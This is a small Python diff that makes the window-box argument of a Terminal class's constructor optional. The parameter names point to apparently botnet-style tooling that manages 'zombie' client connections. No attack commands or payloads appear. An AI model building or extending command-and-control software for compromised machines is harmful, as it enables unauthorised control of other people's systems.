@@ -20,7 +20,7 @@ codes_list = {
 }
 
 class Terminal:
-    def __init__(self, terminal_window_box, command, zombies_addresses_and_communicators_list, default_target ,is_from_gui):
+    def __init__(self, command, zombies_addresses_and_communicators_list, default_target ,is_from_gui, terminal_window_box=None):
         self.terminal_window_box = terminal_window_box
         self.command = command.strip()
         # storing clients sockets and their ips [ip:port,communicator]
